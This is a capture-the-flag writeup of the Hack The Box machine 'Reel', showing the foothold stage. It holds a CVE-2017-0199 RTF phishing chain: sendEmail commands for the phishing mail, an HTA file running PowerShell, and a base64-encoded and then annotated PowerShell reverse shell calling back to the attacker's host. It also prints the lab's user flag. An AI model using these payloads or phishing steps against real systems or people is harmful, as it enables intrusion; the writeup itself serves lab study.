# Reel Writeup
![Reel HTB Icon](https://www.hackthebox.com/storage/avatars/55d0de0cfa8b70e916abbb3f513dc1a7.png)
---

## Summary
Reel was a pretty tricky box, as the name implies, it involved a phishing attack, which is pretty uncommon in CTFs! 
After obtaining command execution via phishing (using a malicious macro) we find an XML credential file allowing us to pivot to a new user. 
Using bloodhound (after some intense proxying) we can eventually find out this user can abuse ACLs to reset the password of another user. This new user has GenericWrite over a group with full access to the filesystem, meaning we can add our controlled users to this group.

## Foothold

Let's kick things off with an autoscan (alias for [nmapAutomator.sh](https://github.com/21y4d/nmapAutomator))

```bash
┌──(kali㉿kali)-[~/…/HTB/hard/reel/foothold]
└─$ autoscan -H '10.10.10.77' -t port

Running a port scan on 10.10.10.77

Host is likely running Windows
                                                             
---------------------Starting Port Scan-----------------------                                                                                          

---------------------Finished all scans------------------------

Completed in 3 seconds

```
Well... that worked

Running it manually works, I think the issue is with nmap itself reporting the host as down (even though it's responding to pings), forcing the script to auto-exit.

Anyway, a quick manual scan shows the following ports
```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 11:24 EDT
Nmap scan report for 10.10.10.77
Host is up (0.028s latency).
Not shown: 1992 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
25/tcp    open  smtp
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
49159/tcp open  unknown
```
Running a script scan we get the following
```bash
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       <DIR>          documents
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp  open  ssh         OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp  open  smtp?
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| [..]
|     220 Mail Service ready
|_    sequence of commands
135/tcp open  msrpc       Microsoft Windows RPC
139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp open  microsoft  Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp open  ncacn_http  Microsoft Windows RPC over HTTP 1.0
Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: REEL
|   NetBIOS computer name: REEL\x00
|   Domain name: HTB.LOCAL
|   Forest name: HTB.LOCAL
|   FQDN: REEL.HTB.LOCAL
|_  System time: 2023-09-23T16:30:44+01:00
| smb2-time: 
|   date: 2023-09-23T15:30:42
|_  start_date: 2023-09-23T15:18:13
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled and required
|_clock-skew: mean: -19m58s, deviation: 34m36s, median: 0s
```
So from this we know some  interesting stuff:
- Anonymous FTP is available
- The domain name is likely HTB.LOCAL and the hostname is REEL
- There's an SMTP daemon running on port 25
- SSH is open (OpenSSH 7.6) which is unusual for a windows box
- The server is likely a Windows 2012 server

### FTP
Let's take a look at FTP.
```bash
ftp> ls
229 Entering Extended Passive Mode (|||41009|)
125 Data connection already open; Transfer starting.
05-29-18  12:19AM       <DIR>          documents
226 Transfer complete.
ftp> cd documents
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||41011|)
125 Data connection already open; Transfer starting.
05-29-18  12:19AM                 2047 AppLocker.docx
05-28-18  02:01PM                  124 readme.txt
10-31-17  10:13PM                14581 Windows Event Forwarding.docx
```
Looks like some interesting files. Let's download them, and take a look.

#### readme.txt
```
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here. 
```

#### AppLocker.docx
```
AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.
```
#### Windows Event Forwarding.docx
```
# get winrm config
winrm get winrm/config
# gpo config
O:BAG:SYD:(A;;0xf0005;;;SY)(A;;0x5;;;BA)(A;;0x1;;;S-1-5-32-573)(A;;0x1;;;NS)		// add to GPO
Server=http://WEF.HTB.LOCAL:5985/wsman/SubscriptionManager/WEC,Refresh=60	// add to GPO (60 seconds)
[..]
collector server -> subscription name -> runtime status
gpupdate /force (force checkin, get subscriptions)
check Microsoft/Windows/Eventlog-ForwardingPlugin/Operational for errors
```

So from these files we can deduce
- There's someone receiving RTF files and converting them to .docx files which are then saved to the FTP server
- AppLocker is in effect for exe,msi,ps1,vbs,cmd,bat and js files in **HASH** mode.
- There's potential hosts WEF.HTB.LOCAL and LAPTOP12.HTB.LOCAL
- It looks like Windows Event Log forwarding is in place and is being sent to WEF.HTB.LOCAL

If we found the name of the user receiving the mail, we might be able to (ab)use a malicious RTF document?

### SMTP (Port 25)

SMTP allows for basic user enumeration, using VRFY, EXPN and RCPT TO and checking the result. For further info check - [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp)
Unfortunately, these methods don't work... VRFY and EXPN don't work, and RCPT TO always shows as valid no matter the recipient.

### SSH (Port 22)

The OpenSSH version **might** be [vulnerable](https://github.com/sriramoffcl/OpenSSH-7.6p1-Exploit-py-/tree/master), as it's running version 7.6 but attempts to exploit it didn't work

### RPC (Port 593)
We can actually connect to RPC anonymously using
```bash
rpcclient reel.htb.local -U "" -N
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> querydispinfo
result was NT_STATUS_ACCESS_DENIED
```
But easy enumeration commands (enumdomusers,enumdomgroups, etc) aren't allowed...
We do get something
```bash
rpcclient $> lsaquery
Domain Name: HTB
Domain Sid: S-1-5-21-2648318136-3688571242-2924127574
```
But everything else fails.

### Exiftool
As some of the files we found in FTP were .docx files, they **might** contain metadata relating to a user.
No usernames were returned from AppLocker.docx, but the Windows Event Forwarding.docx actually contains an email!
```bash
┌──(kali㉿kali)-[~/…/HTB/hard/reel/foothold]
└─$ exiftool 'Windows Event Forwarding.docx'

ExifTool Version Number         : 12.65
File Name                       : Windows Event Forwarding.docx
[..]
Zip File Name                   : [Content_Types].xml
Creator                         : nico@megabank.com <--------- [Oops...]
```
So we have a target, now to construct an exploit.

### RTF

A bit of googling finds this, which looks somewhat promising [CVE-2017-0199 script](https://www.exploit-db.com/exploits/41894)
Now this box was released in 2018, so it lines up pretty well that this would've been **relatively** recent news on release.

A high-level flow of the exploit is as follows - [Source](https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/)

1 - Embed an OLE2 link object in to a Word or RTF document
2 - Set the link to an attacker-controlled URL (e.g. https://evil.com/evil.hta)
3 - Manually edit the object in a text editor to give it the \\objupdate control
4 - Send it to a victim
5 - Victim opens the document
6 - \\objupdate forces an object to update before it is displayed, so a .hta file is fetched and executed with **NO** user interaction or warnings. 

From the [RTF Spec](https://www.biblioscape.com/rtf15_spec.htm)

```
\objupdate
Forces an update to the object before displaying it. Note that this will override any values in the <objsize> control words, but reasonable values should always be provided for these to maintain backwards compatibility.
```
Anyway, the script provided has 2 nice features, it allows for an autopwn (no fun) or a more manual method. I opted for something a bit different...

#### Step 1 - Test it works!
Using the script, I created a basic payload to check if my .hta file was being fetched
```
python2 CVE-2017-0199.py 
	-M gen 
	-w test.rtf 
	-u http://10.10.16.2:8000/test.hta
```

I then setup an HTTP server on port 8000

```
python3 -m http.server         
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
```

And then I sent it to the previously identified user using sendEmail

```
sendEmail 
	-s 10.10.10.77 
	-f click@me.com 
	-t nico@megabank.com 
	-u 'Check this cool RTF document!' 
	-a test.rtf 
	-m 'I think you should open me'

Sep 24 06:34:48 kali sendEmail[49518]: Email was sent successfully!
```

A couple seconds later, boom!

```
10.10.10.77 - - [24/Sep/2023 06:51:23] code 404, message File not found
10.10.10.77 - - [24/Sep/2023 06:51:23] "GET /test.hta HTTP/1.1" 404 -
```

#### Step 2 - Test for code execution
There's no guarantee that the .hta file will actually be executed, although it is very likely. So I'll test to make sure we have command execution.

I'll use this .hta file [here](https://github.com/k4sth4/Malicious-HTA-File) as a template.

```html
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "powershell -C iwr http://10.10.16.2:8000/pwned"
    End Function

    Pwn
  </script>
</html>

```

When we send this, we should see 2 different callbacks. One for /test.hta and another for /pwned.

And sure enough, we see it.

```bash
10.10.10.77 -[24/Sep/2023 06:58:37] "GET /evil.hta HTTP/1.1" 200 
10.10.10.77 -[24/Sep/2023 06:58:38] code 404, message File not found
10.10.10.77 -[24/Sep/2023 06:58:38] "GET /pwned HTTP/1.1" 404 -

```

Code execution achieved!

#### Step 3 - Automate it
To speed things up, I'll automate the process of generating the rtf file and sending an email.

The full code is [here](https://github.com/Henryisnotavailable/HTB/blob/main/REEL/evil_rtf.py)

All that's needed is to create a .hta file that gives us a reverse shell. Because we know powershell is allowed, it's probably best to use that, rather than trying to get netcat on the machine, or using an msfvenom reverse shell.

The final .hta file looks like this
```html
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAiACwAOQAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
    End Function

    Pwn
  </script>
</html>

```

FYI decoding the powershell is a simple reverse shell (comments added for clarity)
```powershell
#Open a new TCP socket to 10.10.16.2:9001
$client = New-Object System.Net.Sockets.TCPClient("10.10.16.2",9001);

#Get a handle for the network stream 
$stream = $client.GetStream();


# % is an alias for foreach-object so this is basically 
# [byte[]] $bytes = 0..65535 | foreach-object {0};
# Which creates an array of 0's [0,0,0 ... 0] which acts as a buffer.
[byte[]] $bytes = 0..65535| %{0};

#While the connection is still up read into the buffer (which is the variable $bytes)
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)  {

	#Convert the bytes to ascii
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
	
	#Run the command using iex (short for Invoke-Expression)
	$sendback = (iex $data 2>&1 | Out-String );
	
	#Fake command prompt to make it look fancy
	$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
	
	#Convert to bytes
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	#Load the stream with the bytes
	$stream.Write($sendbyte,0,$sendbyte.Length);
	
	#Send it back
	$stream.Flush()
	
	}

#Close the connection when finished
$client.Close()
```

Anyway, saving that file and sending the email works!
```
python3 send_email.py payload.rtf http://10.10.16.2/evil.hta 10.10.10.77 mrevil@evil.com nico@megabank.com

[+] Generated payload.rtf successfully
[+] Sending an email, this might take some time... (20 seconds)
Sep 24 10:13:32 kali sendEmail[92718]: Email was sent successfully!
[+] Ok, done. Cleaning up...
```

We get an HTTP request

```
10.10.10.77 - - [24/Sep/2023 09:54:57] "GET /evil.hta HTTP/1.1" 200 -
```

And a hit on our listener

```
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Listening on [::]:9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.77:62076.
whoami
htb\nico
PS C:\Windows\system32>
```

We can now grab user.txt
```
PS C:\> cat C:\Users\nico\desktop\user.txt

a7a57d7c4a29b363acda34b4e1b40265




